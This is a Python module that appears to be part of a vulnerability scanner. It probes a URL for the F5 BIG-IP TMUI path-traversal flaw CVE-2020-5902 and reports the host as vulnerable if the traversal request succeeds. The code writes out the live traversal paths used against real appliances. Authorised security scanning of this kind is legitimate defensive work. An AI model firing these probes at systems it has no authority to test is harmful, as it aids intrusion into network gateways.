import asyncio
from modules.core import console

# F5 BIG-IP Scanner (Network Gateway RCE)
# Focus: CVE-2020-5902 (Traffic Management User Interface - TMUI RCE).
# Path: /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp

async def check_f5(session, url):
    try:
        # Check standard login
        login = f"{url.rstrip('/')}/tmui/login.jsp"
        async with session.get(login, timeout=5, ssl=False) as resp:
            text = await resp.text()
            if "BIG-IP" in text or "F5 Networks" in text:
                 pass # Confirmed F5

        # Check CVE-2020-5902
        # Use simple traversal to access unauthorized info or just check if traversal isn't stripped.
        # Trying to access /tmui/util/getTab.jsp via traversal
        
        target = f"{url.rstrip('/')}/tmui/login.jsp/..;/tmui/util/getTab.jsp"
        
        async with session.get(target, timeout=5, ssl=False) as v_resp:
            if v_resp.status == 200:
                 return {
                    "url": target,
                    "type": "F5 BIG-IP TMUI RCE (CVE-2020-5902)",
                    "evidence": "Traversal successful. Accessed /tmui/util/getTab.jsp"
                }

    except Exception:
        pass
    return None

async def scan_f5(session, url):
    """
    Scan for F5 BIG-IP Vulnerabilities.
    """
    console.print(f"\n[bold cyan]--- F5 BIG-IP Scanner ---[/bold cyan]")
    
    results = []
    res = await check_f5(session, url)
    if res:
         console.print(f"  [bold red][!] F5 BIG-IP VULNERABLE: {res['url']}[/bold red]")
         console.print(f"      Status: {res['type']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No F5 BIG-IP RCE vectors found.[/dim]")
        
    return results
